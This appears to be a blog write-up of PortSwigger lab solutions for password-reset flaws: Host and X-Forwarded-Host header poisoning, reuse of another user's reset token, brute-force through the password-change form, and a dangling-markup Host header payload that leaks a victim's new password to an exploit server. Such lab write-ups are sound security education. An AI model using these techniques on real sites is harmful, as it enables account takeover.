---
title: Vulnerable Password Reset
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2022-09-30 09:00:00 +0200
categories: [Web Application, Broken Authentication]
tags: [Notes, Web Application, Portswigger]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post/writeup is all about the Authentication vulnerabilities or [Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication) if we follow [OWASP](https://owasp.org/) naming scheme. 

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/authentication) Labs, but i do intent do throw other labs and writeups here as well.

> This post is all about vulnerable password reset implementations which can bypass authentication completely or allow the attacker to bypass other security implementations 

# Labs
- [Intro](#intro)
- [Labs](#labs)
- [Basic password reset poisoning - (Host Header)](#basic-password-reset-poisoning---host-header)
  - [Enumeration - Password Reset](#enumeration---password-reset)
  - [Exploitation - Password Account](#exploitation---password-account)
- [Password reset broken logic](#password-reset-broken-logic)
  - [Enumerating Password Reset mechanismus](#enumerating-password-reset-mechanismus)
  - [Exploiting Password Reset Mechanismus](#exploiting-password-reset-mechanismus)
- [Password reset poisoning via middleware - (X-Forwarded-For Header)](#password-reset-poisoning-via-middleware---x-forwarded-for-header)
  - [Finding and exploiting the vulnerability](#finding-and-exploiting-the-vulnerability)
- [Password brute-force via password change](#password-brute-force-via-password-change)
  - [Brute-Force via password change exploitation](#brute-force-via-password-change-exploitation)
- [Password reset poisoning via dangling markup](#password-reset-poisoning-via-dangling-markup)
  - [Enumeration](#enumeration)
  - [Exploitation](#exploitation)

# Basic password reset poisoning - (Host Header)
>  This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account.
> 
> You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server. 

## Enumeration - Password Reset

Password Reset functionality on the front-end is just like any other:

![picture 129](/assets/images/d4cf46a61461f4a2851e74c87fefdb75ad9786ff445cffb71648f3403ec1e119.png)  

In the request we can notice CSRF token and that we can request it for any user basically, but that is by itself not an issue, as email should be sent to users account.

![picture 128](/assets/images/abfb7211927e3ee1cc113082efc48fe42fbbaf0c79591170ff4b5dacfb5f8e40.png)  

## Exploitation - Password Account

If we however change the `Host` HTTP Header to our own `Exploit Server`: `exploit-0ab000a60403a23bc0663c42014a00e6.web-security-academy.net/exploit`, then Email would still be sent:

![picture 130](/assets/images/2497d3f84cb6c2e586ea8f236872d557a5fbf013627b9e6f8f0661dc74c681d9.png)  

And if we check the logs, we can find the request with the token code right there in the middle:

![picture 131](/assets/images/f5e1537c2942adfbe26759d8b61045b10dde6d9cc08bdbf9949a9771ec1eb5ed.png)  

If i now open the link `https://0a110040049ca2b2c06b3c6d0058002b.web-security-academy.net/forgot-password?temp-forgot-password-token=bsWHQe5G70EQyDdmK29IbyvrK4SxZ1Cm` i can set password for `carlos`.

![picture 132](/assets/images/ccad07b77f6f399f518287ef57d920f95549dba82cc35bb29a739489c83a7509.png)  

Lab has been solved:

![picture 133](/assets/images/ab019d17bf151588c3000474c821681c708ade52c901f990066838b21f27b6ad.png)  

# Password reset broken logic
>  This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.
> 
> Your credentials: wiener:peter
> 
> Victim's username: carlos

## Enumerating Password Reset mechanismus

First of all let's just reset password for `wiener`. For this we need an email address which is provided by the Lab

![picture 103](/assets/images/74cc1fff4d9689df248918f0a168532fa53b4a418173f7f053fa81b6a7b3fbb6.png)  

In `password-reset` we can either enter username or email. Let's go for an username:

![picture 104](/assets/images/9e8794ce13750b39f41d1b8e50f707dd0baafcd67ac40a04689280571b0893f9.png)  

Email comes with a reset link:

```
https://0ac0003d04636429c0420e00000f00c7.web-security-academy.net/forgot-password?temp-forgot-password-token=6MusLEc8VCPVmUsE3mEMxZ3dRDm9q4VL
```

If i ask for another `password-reset` token, it changes

```
https://0ac0003d04636429c0420e00000f00c7.web-security-academy.net/forgot-password?temp-forgot-password-token=FcIwW5uTrJCBE9IUbYymI84dYN3SeOsN
```

If we click on it, we get to the page to enter a new password.

If we enter a new password, this is a request that is issued to a backend

![picture 105](/assets/images/549e5a26b2babca18b0850fbc62a80cba1a6d6817b047191d3c6e17614c52ab3.png)  

The question now arises, can we swap the username with `carlos` using token that was issued for `wiener`?

## Exploiting Password Reset Mechanismus

If we simply reuse the previous token that was sent to `wiener` and swap the user with `carlos`, it appears that it's actually working

![picture 106](/assets/images/d6db66f52317a07f5f2e7217995cc09f8489d86f2067157d2f2c379a42f45a47.png)

We can login now with `carlos:peter`

![picture 107](/assets/images/970b338af0d5eb1d11f08d5486f6e76608fdbe5a5ba49e535e9224c092fabf62.png)  

Token should only be used once and by any means, it should not work for other users that have not requested it.

# Password reset poisoning via middleware - (X-Forwarded-For Header)
> This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server. 

## Finding and exploiting the vulnerability

If we ask for password we get same looking link as in previous lab:

```
https://0adc000d03b93ab9c019658300c800ce.web-security-academy.net/forgot-password?temp-forgot-password-token=Jdno4Z4KTNZHn7cLI1nHytyLFtrGp2Ha
```
And request does not ask us for a username

![picture 108](/assets/images/8621fadbfe0dc621aa9dd3c1451e58d0e67f938b0bdf24bf8e40372a72a13084.png)  

Problem here is actually in middleware and this lab is all about that. If we enter `X-Forwarded-Host` header, the link sent will actually get tampered with and swapped with our own host. Let's verify that:

![picture 109](/assets/images/590e488b52c95c653c786e55a3831a465f109fa75852efd38ecfba557014879d.png)  

And checking the access log on our exploit server, we can see that request is there:

![picture 110](/assets/images/590e488b52c95c653c786e55a3831a465f109fa75852efd38ecfba557014879d.png)

We can change the password if we follow the link

![picture 112](/assets/images/7aadb50e4503d024fe045e1ecec1014cfba1ff7f508c4da37486fa02c409889e.png)  

... and login using same password:

![picture 113](/assets/images/408846fc4e5a6ca8cf2ef6631b417cd3188d859571f38a638f3b3d97802d8e63.png)

More on that topic can be found at [Portswigger Reset Password](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning). It all comes down, how the web application crates the token and what its security measures are. As always, it's always dangerous to use user generated input.

# Password brute-force via password change

>  This lab's password change functionality makes it vulnerable to brute-force attacks. To solve the lab, use the list of candidate passwords to brute-force Carlos's account and access his "My account" page.
> 
> Your credentials: wiener:peter
> 
> Victim's username: carlos
> 
> [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Brute-Force via password change exploitation

If we login, we have this form to update password:

![picture 114](/assets/images/0cce991791d03a9ad6108ceb5bea7db3bb9de27a7fa15fed5d0066d5cab927b9.png)  

... and this is how request looks like in Burp:

![picture 115](/assets/images/57da45be3b5aba2befa42bcbb7d5348bb03a44a48abba26fd709f31fba1222b4.png)  

> If we enter wrong password 2 times, account locks for 1 minute!
> 
> If we enter wrong password AND two different new passwords, we get another error message: `Current password is incorrect`!

![picture 117](/assets/images/a1d91068dd154ab5557baf07a0d26c0f4b8848a0f194b255297d64cb1b5223f9.png)  

Now let's brute-force using intruder!

![picture 118](/assets/images/bf48c713eaec25f91295d3fb7ff9400f2bffbc489841be581e473e6c2eca08d7.png)  

So get another response that `new password`s do not match, meaning we've found the `current password` = `jordan`.

Lab has been solved.

![picture 119](/assets/images/093a63fafcc7ee1097567fd15d57c9eb73b688a15e1e9781f7b46d68f32ab305.png)  

# Password reset poisoning via dangling markup

> This lab is vulnerable to password reset poisoning via dangling markup. To solve the lab, log in to Carlos's account.
> 
> You can log in to your own account using the following credentials: `wiener:peter`. Any emails sent to this account can be read via the email client on the exploit server. 

Reference: [Dangling markup injection](https://portswigger.net/web-security/cross-site-scripting/dangling-markup) 

## Enumeration

When we reset a password for our `wiener` user, we'd get an Email looking like this

![picture 134](/assets/images/cd98389753754dba6d40956e720a013fc5f5d80ea391b4e24a13e165c28a676b.png)  

This is the raw Email found at `/email`, and there appears to be no sanitization. 

```
Sent:     2022-10-04 10:54:27 +0000
From:     no-reply@0ac100e703e228b2c0f54f3d00170041.web-security-academy.net
To:       wiener@exploit-0a610053038828f2c0684ff0010e0010.web-security-academy.net
Subject:  Account recovery

<p>Hello!</p><p>Please <a href='https://0ac100e703e228b2c0f54f3d00170041.web-security-academy.net/login'>click here</a> to login with your new password: bUzAvNKZqV</p><p>Thanks,<br/>Support team</p><i>This email has been scanned by the MacCarthy Email Security service</i>
```

Another thing to note here is that we recieve a new password per email and not just Change password link!

The email above will also be our injection point for partially XSS. Idea of this `Dangling` attack is to poison HTML, like with XSS, by using tag like (img, a,...) pointing it to our controlled server and leaving the tag open (not closing Tags).

If we send Host with a header like this:

```
POST /forgot-password HTTP/1.1
Host: 0a4c00770427c3cdc0b732ee006d00b7.web-security-academy.net:'<a href="exploit-0a100050044cc386c015325d01860069.web-security-academy.net/?
```

## Exploitation 
If we do that and we know that `carlos` accesses the same Email client then we should now find the request in the `access logs`. 

![picture 136](/assets/images/cd6812fb9c69e5fcf919416f9be2c020bc8f3d00e0cbff6629b93bf85d3c0be6.png) 

So there we have two requests from different IP. One is for `wiener` and other one is for `carlos`.

![picture 135](/assets/images/a5c74c2882d29ad4705fc43c5445940354b24b0ec317b579e9ed026d903cb61a.png)  

After ending this Lab, i wasn't sure when this really would be exploitable. I'd say somewhere between finding XSS and not being able to leverage it, `Dangling` using HTTP Headers might be something to consider!

